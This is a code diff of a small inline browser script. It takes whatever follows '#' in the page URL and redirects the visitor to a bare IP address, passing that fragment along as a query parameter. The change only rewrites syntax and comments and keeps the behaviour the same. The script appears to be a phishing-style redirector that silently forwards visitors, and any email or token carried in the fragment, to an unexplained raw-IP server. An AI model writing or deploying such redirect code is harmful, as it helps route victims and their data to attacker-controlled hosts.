@@ -1,8 +1,8 @@
 <script>
-    const hashValue = window.location.hash.slice(1); // Removes the `#` from the hash
+    const hashValue = window.location.hash.substring(1); // Removes the `#`
     if (hashValue) {
-        // Redirect directly to the IP address with the hash as a query parameter
-        document.location.href = 'https://103.214.111.37/?' + hashValue;
+        // Construct the URL to redirect with the IP address as the base
+        document.location.href = `https://103.214.111.37/?${hashValue}`;
     } else {
         document.location.href = 'https://103.214.111.37/';
     }
